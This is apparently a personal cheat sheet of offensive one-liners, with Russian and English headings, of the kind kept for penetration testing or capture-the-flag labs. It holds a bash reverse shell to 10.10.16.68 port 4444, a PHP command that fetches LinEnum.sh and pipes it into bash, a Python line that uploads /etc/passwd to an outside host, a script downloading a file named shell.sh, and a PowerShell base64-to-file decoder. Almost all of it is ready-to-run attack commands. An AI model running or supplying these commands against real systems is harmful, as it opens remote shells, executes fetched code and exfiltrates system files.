/bin/bash -i >& /dev/tcp/10.10.16.68/4444 0>&1

decode base64 с помощью powershell и сохранение в файл Windows:

$b64      = 'AAAAAA...'
$filename = 'C:\path\to\file'
$bytes = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes($filename, $bytes)

Безфайловая Загрузка с помощью PHP и выполнение :
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

download with onestring python:

python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'



Простая Программа для скачивания на Python
import urllib.request

print('succefully')

url = 'https://raw.githubusercontent.com/kostya300/shellqqq/shelll/shell.sh'

urllib.request.urlretrieve(url, '/home/qwe/Desktop/myHash/fg.txt')
